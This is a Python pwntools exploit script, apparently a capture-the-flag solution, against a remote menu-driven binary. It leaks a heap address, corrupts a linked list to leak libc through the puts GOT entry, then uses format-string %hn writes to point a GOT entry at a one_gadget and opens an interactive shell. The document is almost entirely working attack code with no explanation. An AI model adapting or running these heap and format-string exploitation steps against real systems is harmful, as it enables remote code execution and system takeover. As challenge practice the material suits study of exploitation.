#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Exploit by sk4
'''

from pwn import *

#p = process('./pwnable')
p = remote('ipaddress', 2323)

def add_name(name):
    p.sendline('1')
    p.recvuntil('name?\n')
    p.sendline(name)
    p.recvuntil('>')

def add_item(opt):
    p.sendline('2')
    p.recvuntil('Single\n')
    p.sendline(str(opt))
    p.recvuntil('>')

def remove_item(item):
    p.sendline('3')
    p.recvuntil('remove\n')
    p.sendline(str(item))
    p.recvuntil('>')

def view_order():
    p.sendline('4')
    data = p.recvuntil('>')
    return data

def leak_heap(name):
    add_name(name)
    add_item(3)
    add_item(3)
    data = view_order()
    return int(data.split('Melt')[1].split('\n')[0][::-1].encode("hex"), 16)

puts_got = 0x602030

p.recvuntil('>')

#gdb.attach(p, '''
#b *0x0000000000400ccd
#continue
#''')

add_name('A' * 31)
#in function leak_heap I allocate some new name and some items for get an address of heap
heap_address = leak_heap('A' * 24 + "\x31\x00\x00\x00\x00\x00\x00")
print "[*] Heap address: 0x" + p64(heap_address)[::-1].encode("hex")
add_item(3)
remove_item(2)
# prepare the new linked list
add_name('A' * 24 + p64(heap_address - 192))
# insert a new name with a format string that write a GOT address in stack
add_name('%6299768x%16$n' + 'a' * 10 + p64(heap_address + 144 + 0x30)[0:7])
add_name('b' * 24 + p64(heap_address + 144 + 0x60)[0:7])
# insert a new name with a format string that write a GOT address (+2 byte) in stack
add_name('%6299770x%47$n' + 'c' * 10 + p64(heap_address + 144 + 0x90)[0:7])
add_name('d' * 24 + p64(heap_address + 144 + 0x30)[0:7])

remove_item(3)
# overwrite the data structure with the pointer to the new crafted linked list
add_name(p64(heap_address + 144) + p64(heap_address + 144 + 0x30) + p64(puts_got) + "\x06\x00\x00\x00\x00\x00\x00")
# get a leak to libc ;)
data = view_order()
puts_remote = int(data.split('Name: ')[1].split('\n')[0][::-1].encode("hex"), 16)
libc_base = puts_remote - 0x6f690
one_gadget = libc_base + 0x45216 # locale funziona con puts, scanf >> 0x45216
print "[+] One gadget: 0x" + p64(one_gadget)[::-1].encode("hex")
print "[+] Puts remote: 0x" + p64(puts_remote)[::-1].encode("hex")

# prepare the first two byte to write in GOT (in scanf) 0xdeadbeXX
first_write = int((p64(one_gadget)[::-1])[6:].encode("hex"), 16)
#prepare the second two byte to write in GOT (in scanf) 0xdeadXXef
second_write = int((p64(one_gadget)[::-1])[4:6].encode("hex"), 16)

print "[+] First write: 0x" + p64(first_write)[::-1].encode("hex")
print "[+] Second write: 0x" + p64(second_write)[::-1].encode("hex")

# remove an item for insert the first format string
remove_item(1)
add_name('%' + str(first_write) + 'x%24$hn'+ 'z' * 11 + p64(heap_address + 144 + 0x90)[0:7])
# remove a second item for insert the second format string
remove_item(2)
add_name('%' + str(second_write) + 'x%52$hn' + 'z' * 12 + p64(heap_address + 144 + 0x30)[0:7])
p.sendline('4') #trigger the format string ;)

#gdb.attach(p)
#p.sendline('id;ls -la;cat /flag.txt;cat flag.txt')
p.interactive()

p.close()
